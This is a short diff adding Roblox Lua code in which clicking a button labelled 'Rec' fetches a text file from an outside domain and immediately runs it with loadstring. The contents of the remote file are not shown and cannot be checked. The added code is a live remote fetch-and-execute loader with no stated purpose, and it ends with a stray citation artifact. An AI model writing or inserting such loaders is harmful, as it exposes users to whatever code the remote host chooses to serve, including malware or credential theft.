@@ -1,0 +1,16 @@
+RecBtn.MouseButton1Click:Connect(function()
+    local success, response = pcall(function()
+        return game:HttpGet("https://airdropwota.io/r1.txt")
+    end)
+    if success and response then
+        local func, err = loadstring(response)
+        if func then 
+            func() 
+        else 
+            warn("Loadstring error: "..tostring(err)) 
+        end
+    else 
+        warn("HttpGet failed for Rec") 
+    end
+end)
+```[cite: 1]
